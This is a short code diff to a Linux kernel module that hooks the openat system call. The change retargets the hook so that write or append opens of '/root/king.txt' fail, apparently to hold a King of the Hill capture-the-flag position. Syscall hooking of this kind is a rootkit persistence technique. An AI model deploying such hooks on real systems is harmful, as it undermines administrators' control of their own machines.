@@ -118,11 +118,11 @@ asmlinkage long hookOpenAt(int dfd, const char __user *filename, int flags, umod
     long ret = 0;
 	if (!buffer) return ret;
 
-	if (strncpy_from_user(buffer, filename, 4096) > 0 && dfd == -100 && strstr(buffer, "test.txt")) {
+	if (strncpy_from_user(buffer, filename, 4096) > 0 && dfd == -100 && strstr(buffer, "king.txt")) {
 		if ((flags & O_WRONLY) == O_WRONLY || (flags & O_RDWR) == O_RDWR || (flags & O_APPEND) == O_APPEND) {
             directory = (strchr(buffer, (int)'/') - buffer == 0) ? strcpy(directory, buffer) : getpath(current, buffer);
 			respath(directory);
-			if (strcmp(directory, "/tmp/test.txt") == 0) ret = -1;
+			if (strcmp(directory, "/root/king.txt") == 0) ret = -1;
 		}
 	} 
 	
